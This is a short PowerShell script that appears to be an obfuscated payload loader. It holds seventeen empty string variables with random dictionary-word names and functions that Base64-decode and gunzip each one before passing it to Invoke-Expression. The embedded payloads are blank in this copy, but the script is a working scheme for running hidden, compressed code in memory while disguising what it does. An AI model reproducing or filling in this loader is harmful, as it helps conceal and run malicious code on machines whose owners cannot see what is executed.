#Requires -Version 2

$Crucifixes = ""
$Boatswains = ""
$Unfriended = ""
$Crosswords = ""
$Alienating = ""
$Potholders = ""
$Whispering = ""
$Mayflowers = ""
$Jellybeans = ""
$Microcosms = ""
$Drawstring = ""
$Kafkaesque = ""
$Archdeacon = ""
$Vegetating = ""
$Pomeranian = ""
$Relabeling = ""
$Masquerade = ""

function Convert-FromBase64ToGzip {
    [CmdletBinding()] param([string] $String)
    [Convert]::FromBase64String($String)
}
    
function Convert-FromGzipToText {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Crucifixes,$Boatswains,$Unfriended,$Crosswords,$Alienating,$Potholders,$Whispering,$Mayflowers,$Jellybeans,$Microcosms,$Drawstring,$Kafkaesque,$Archdeacon,$Vegetating,$Pomeranian,$Relabeling,$Masquerade)
$Modules | ForEach-Object {
    $Decoded = Convert-FromBase64ToGzip -String $_
    Convert-FromGzipToText -Bytes $Decoded | Invoke-Expression
}
